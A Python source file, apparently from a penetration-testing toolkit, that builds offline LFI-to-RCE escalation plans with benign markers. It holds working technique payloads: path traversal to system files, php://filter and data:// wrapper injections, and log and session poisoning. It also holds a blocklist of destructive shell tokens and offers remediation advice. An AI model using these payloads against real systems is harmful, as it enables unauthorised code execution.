"""[SAFETY: read-only, NOL jaringan] lfi_rce_playbook — generator tangga
LFI/path-traversal -> RCE (CWE-98/CWE-22), berpenanda JINAK. TIDAK mengirim
apa pun; menghasilkan rencana uji untuk LFI yang SUDAH terkonfirmasi (lab).

Konsep LFI->RCE (php wrapper/filter, log/session poisoning, /proc/self/environ,
padanan Windows) — dibangun FROM SCRATCH, stdlib murni, offline.

Ceruk vs modul lain (anti-duplikasi):
  - exploit_playbooks `LfiTraversal` = LIVE (baca file sungguhan). `skills/
    file_exposure_checker.py` = deteksi paparan. Tool ini OFFLINE: generator
    tangga per os/stack dengan marker jinak; eksekusi = next-step LIVE.

Semua keluaran = L1 LEAD `lab_only` (rencana, bukan bukti). Penanda uji JINAK
saja (baca /etc/hostname, `echo 7*7`, marker 'secai-lfi-poc') — TIDAK PERNAH
token destruktif. Stack tak dikenal => exit 2 (fail-closed).

Input -> mekanisme -> output:
  - Input : --param <nama parameter rentan>; --os linux|windows;
            --stack php|java|python|node|generic; --evidence <catatan LFI
            terkonfirmasi, opsional>.
  - Output: JSON kontrak; --out; --fail-on. Exit 0/1/2.
"""
from __future__ import annotations

import argparse
import json
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "core"))
from findings import make_finding, write_findings  # noqa: E402

SCHEMA = "cyphron.lfi-rce-playbook/1"
TOOL = "lfi-rce-playbook"
MARK = "secai-lfi-poc"
OSES = ("linux", "windows")
STACKS = ("php", "java", "python", "node", "generic")


def _rungs(os_: str, stack: str) -> list[tuple[str, str, str]]:
    """-> [(rung, payload_jinak, catatan)]."""
    r: list[tuple[str, str, str]] = []
    # 1) baca (traversal) — berlaku semua
    if os_ == "linux":
        r.append(("read-traversal", "../../../../../../etc/hostname",
                  "benign read to prove traversal depth"))
        r.append(("proc-environ", "../../../../../../proc/self/environ",
                  "read env (also a poisoning sink if CGI)"))
    else:
        r.append(("read-traversal", r"..\..\..\..\..\..\windows\win.ini",
                  "benign read to prove traversal depth"))
    # 2) rung spesifik stack
    if stack == "php":
        r.append(("php-filter-source",
                  "php://filter/convert.base64-encode/resource=index.php",
                  "read source (base64) via php filter wrapper"))
        r.append(("data-wrapper",
                  "data://text/plain;base64," +
                  "PD9waHAgZWNobyA3Kjc7ID8+",  # <?php echo 7*7; ?>
                  "benign RCE proof (echo 7*7) via data:// wrapper"))
        r.append(("log-poisoning",
                  "User-Agent: <?php echo '%s'; ?>  then include "
                  "../../../../var/log/apache2/access.log" % MARK,
                  "poison access log with a benign marker, then include it"))
        r.append(("session-poisoning",
                  "set a session value to <?php echo '%s'; ?> then include "
                  "/var/lib/php/sessions/sess_<ID>" % MARK,
                  "benign marker via PHP session file"))
    elif stack in ("python", "node", "java"):
        r.append(("template-or-log",
                  "include/poison an app-writable log or template with marker "
                  "'%s' (stack=%s) — exec path depends on how the include is "
                  "evaluated" % (MARK, stack),
                  "RCE path is stack-specific; confirm the sink evaluates code"))
    # generic: hanya read rung
    return r


def analyze(param: str, os_: str, stack: str, evidence: str = "") -> dict:
    os_ = (os_ or "linux").strip().lower()
    stack = (stack or "generic").strip().lower()
    if os_ not in OSES:
        raise ValueError("os harus linux|windows")
    if stack not in STACKS:
        raise ValueError("stack harus salah satu: %s" % ", ".join(STACKS))
    param = (param or "page").strip()
    rungs = _rungs(os_, stack)
    # jaga anti-destruktif: tak boleh ada token berbahaya
    blob = " ".join(p for _, p, _ in rungs).lower()
    for bad in ("rm -", "mkfs", "dd if=", ":(){", "format c:", "del /f"):
        if bad in blob:
            raise ValueError("internal: destructive token leaked (%s)" % bad)
    ladder_text = "\n".join(
        "  [%d] %s: %s\n       (%s)" % (i + 1, rung, payload, note)
        for i, (rung, payload, note) in enumerate(rungs))
    poc = ("LFI->RCE ladder for param '%s' (os=%s, stack=%s), benign markers "
           "only:\n%s\nnext-step (LIVE, not done here): apply a rung through "
           "the confirmed LFI and look for the marker '%s' / '49' in the "
           "response." % (param, os_, stack, ladder_text, MARK))
    desc = ("Generated an LFI->RCE escalation ladder (%d rung(s)) for a "
            "confirmed LFI on param '%s'. These are PLANS with benign markers; "
            "RCE is not proven offline." % (len(rungs), param))
    if evidence:
        desc += " Context: %s" % evidence[:200]
    f = make_finding(
        tool=TOOL,
        title="LFI->RCE ladder for '%s' (%s/%s)" % (param, os_, stack),
        severity="high", cwe="CWE-98",
        description=desc,
        recommendation=("Never pass user input to include/require/file APIs; "
                        "use an allowlist of file ids; disable PHP wrappers; "
                        "store logs outside the web root."),
        param="lfi:%s:%s:%s" % (param, os_, stack),
        status="unconfirmed", verdict=1, evidence_kind="payload",
        confidence=0.6, lab_only=True, poc=poc,
        extra={"kind": "lfi", "rungs": [r for r, _, _ in rungs],
               "os": os_, "stack": stack})
    stats = {"rungs": len(rungs), "os": os_, "stack": stack, "findings": 1}
    return {"schema": SCHEMA, "tool": TOOL, "stats": stats, "notes": [],
            "findings": [f]}


def main(argv: list[str] | None = None) -> int:
    ap = argparse.ArgumentParser(
        description="Generate an LFI->RCE escalation ladder (benign markers) — offline.")
    ap.add_argument("--param", default="page")
    ap.add_argument("--os", default="linux", choices=list(OSES))
    ap.add_argument("--stack", default="generic", choices=list(STACKS))
    ap.add_argument("--evidence", default="")
    ap.add_argument("--out")
    ap.add_argument("--fail-on", default="none",
                    choices=["none", "any", "high", "medium", "low"])
    args = ap.parse_args(argv)
    try:
        result = analyze(args.param, args.os, args.stack, args.evidence)
    except ValueError as exc:
        print("[lfi-rce-playbook] input error: %s" % exc, file=sys.stderr)
        return 2
    result["requests"] = 0
    if args.out:
        write_findings(args.out, result["findings"], meta={
            "schema": SCHEMA, "tool": TOOL, "stats": result["stats"],
            "notes": [], "requests": 0})
    print(json.dumps(result, ensure_ascii=False, indent=2, sort_keys=True))
    if args.fail_on == "none":
        return 0
    if args.fail_on == "any":
        return 1 if any(f["severity"] != "info" for f in result["findings"]) else 0
    need = {"high": {"critical", "high"},
            "medium": {"critical", "high", "medium"},
            "low": {"critical", "high", "medium", "low"}}[args.fail_on]
    return 1 if any(f["severity"] in need for f in result["findings"]) else 0


if __name__ == "__main__":
    sys.exit(main())
